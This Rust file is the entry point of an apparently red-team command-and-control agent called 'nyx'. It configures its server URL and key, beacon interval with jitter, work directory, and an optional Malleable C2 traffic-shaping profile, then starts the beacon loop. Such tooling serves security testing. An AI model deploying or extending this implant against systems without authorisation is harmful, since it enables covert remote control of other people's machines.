use nyx_agent_dev::Config;

fn main() -> anyhow::Result<()> {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env().unwrap_or_else(|_| "warn".into()),
        )
        .init();

    let server_url =
        std::env::var("NYX_SERVER").unwrap_or_else(|_| "http://127.0.0.1:8443".to_string());
    let server_pub_hex = std::env::var("NYX_SERVER_PUB").expect("NYX_SERVER_PUB required (hex)");
    let server_pub = hex::decode(&server_pub_hex)
        .expect("NYX_SERVER_PUB must be hex")
        .try_into()
        .expect("NYX_SERVER_PUB must be 32 bytes");
    let sleep_seconds: u32 = std::env::var("NYX_SLEEP")
        .ok()
        .and_then(|s| s.parse().ok())
        .unwrap_or(5);

    tracing::info!(%server_url, "nyx dev agent starting");
    let work_dir =
        std::path::PathBuf::from(std::env::var("NYX_WORKDIR").unwrap_or_else(|_| ".".to_string()));
    // Ensure the work directory exists before entering the beacon loop. File
    // ops (mkdir/cp/mv/...) resolve paths against `work_dir` via
    // `canonicalize`, which fails outright if the directory is absent — so a
    // freshly-configured NYX_WORKDIR (e.g. /tmp/nyx-agent-workdir) would make
    // every relative FileOp return an error on the first beacon. "." (the
    // default) always exists, so this is effectively a no-op unless the
    // operator pointed NYX_WORKDIR somewhere new.
    std::fs::create_dir_all(&work_dir).map_err(|e| {
        anyhow::anyhow!(
            "NYX_WORKDIR `{}` cannot be created: {e}",
            work_dir.display()
        )
    })?;
    let beacon_uri = std::env::var("NYX_BEACON_URI").unwrap_or_else(|_| "/beacon".to_string());
    // Optional Malleable C2 profile: when set, the agent inverts the profile's
    // server.output envelope on responses (mirrors the server's shaping).
    let profile = match std::env::var("NYX_PROFILE") {
        Ok(p) => {
            let src = std::fs::read_to_string(&p)?;
            Some(nyx_profile::parse(&src)?)
        }
        Err(_) => None,
    };
    nyx_agent_dev::run(Config {
        server_url,
        server_pub,
        sleep_seconds,
        jitter_pct: 20,
        work_dir,
        beacon_uri,
        profile,
    })
}
